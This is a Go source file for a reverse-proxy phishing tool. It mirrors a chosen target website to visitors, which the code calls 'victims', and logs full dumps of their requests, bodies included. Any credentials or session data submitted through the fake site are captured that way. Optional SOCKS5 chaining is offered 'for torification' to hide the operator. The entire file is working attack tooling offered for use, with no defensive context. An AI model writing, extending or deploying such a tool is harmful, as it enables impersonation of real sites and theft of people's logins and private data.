package main

import (
	"bufio"
	"flag"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	_ "net/http/pprof"
	"net/url"
	"time"

	"golang.org/x/net/proxy"
)

const (
	DEFAULT_TIMEOUT = 20 * time.Second
)

var (
	targetURL      = flag.String("target", "", "The website we want to phish.")
	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
)

// Phishes a target URL with a custom HTTP client.
type PhishingProxy struct {
	client    *http.Client
	targetURL *url.URL
}

func (p *PhishingProxy) rewriteHeaders(request *http.Request) {
	request.URL.Scheme = p.targetURL.Scheme
	request.URL.Host = p.targetURL.Host
	request.Host = p.targetURL.Host
	// Prevent panics, see: https://stackoverflow.com/questions/19595860/http-request-requesturi-field-when-making-request-in-go
	request.RequestURI = ""
}

func (p *PhishingProxy) HandleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	request, err := http.ReadRequest(reader)
	if err != nil {
		log.Println("Error parsing request:", err.Error())
		return
	}

	p.rewriteHeaders(request)
	r, err := httputil.DumpRequest(request, true)
	if err != nil {
		log.Println("Error dumping request to console.")
	}
	log.Println(string(r))
	resp, err := p.client.Do(request)
	if err != nil {
		log.Println("Proxy error:", err.Error())
		return
	}

	log.Println(request.URL, "-", resp.Status)
	modifiedResponse, err := httputil.DumpResponse(resp, true)
	if err != nil {
		log.Println("Error converting requests to bytes:", err.Error())
		return
	}

	_, err = conn.Write(modifiedResponse)
	if err != nil {
		log.Println("Error responding to victim:", err.Error())
		return
	}
}

func main() {
	flag.Parse()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		panic(err.Error())
	}

	server, err := net.Listen("tcp", *address)
	if err != nil {
		panic(err.Error())
	}
	log.Println("Listening on:", *address)

	var client *http.Client
	if *proxyAddress != "" {
		dialer, err := proxy.SOCKS5("tcp", *proxyAddress, nil, proxy.Direct)
		if err != nil {
			panic(err.Error())
		}
		httpTransport := &http.Transport{}
		httpTransport.Dial = dialer.Dial
		client = &http.Client{
			Timeout:   DEFAULT_TIMEOUT,
			Transport: httpTransport,
		}
	} else {
		client = &http.Client{
			Timeout: DEFAULT_TIMEOUT,
		}
	}

	phishingProxy := &PhishingProxy{
		client:    client,
		targetURL: u,
	}

	if *attachProfiler {
		go func() {
			log.Println("Starting profiler.")
			log.Println(http.ListenAndServe("localhost:6060", nil))
		}()
	}

	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Error when accepting request,", err.Error())
		}
		go phishingProxy.HandleConnection(conn)
	}
}
